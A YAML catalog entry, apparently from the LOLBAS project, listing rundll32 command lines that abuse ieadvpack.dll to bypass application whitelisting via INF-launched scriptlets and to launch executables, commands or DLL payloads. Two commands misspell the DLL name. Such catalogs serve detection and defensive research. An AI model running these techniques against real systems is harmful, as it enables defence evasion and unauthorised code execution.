---
name: ieadvpack.dll
description: INF installer for Internet Explorer. Has much of the same functionality as advpack.dll.
functions:
  awl-bypass:
    - description: Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).
      code: rundll32.exe ieadvpack.dll,LaunchINFSection c:\test.inf,DefaultInstall_SingleUser,1,
    - description: Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied).
      code: rundll32.exe ieadvpack.dll,LaunchINFSection test.inf,,1,
  execute:
    - description: Launch executable by calling the RegisterOCX function.
      code: rundll32.exe iedvpack.dll,RegisterOCX calc.exe
    - description: Launch command line by calling the RegisterOCX function.
      code: rundll32 ieadvpack.dll, RegisterOCX "cmd.exe /c calc.exe"
    - description: Launch a DLL payload by calling the RegisterOCX function.
      code: rundll32.exe iedvpack.dll,RegisterOCX test.dll
resources:
    - resource: https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/
    - resource: https://twitter.com/pabraeken/status/991695411902599168
    - resource: https://twitter.com/0rbz_/status/974472392012689408
    - resource: https://github.com/LOLBAS-Project/LOLBAS-Project.github.io/blob/master/_lolbas/Libraries/Payload/Ieadvpack.inf
    - resource: https://github.com/LOLBAS-Project/LOLBAS-Project.github.io/blob/master/_lolbas/Libraries/Payload/Ieadvpack_calc.sct
fullpath: 
    - path: c:\windows\system32\ieadvpack.dll
    - path: c:\windows\syswow64\ieadvpack.dll
notes: Thanks to Jimmy - @bohops (LaunchINFSection), fabrizio - @0rbz_ (RegisterOCX - DLL), Moriarty @moriarty_meng (RegisterOCX - Cmd), Nick Carr - @ItsReallyNick
---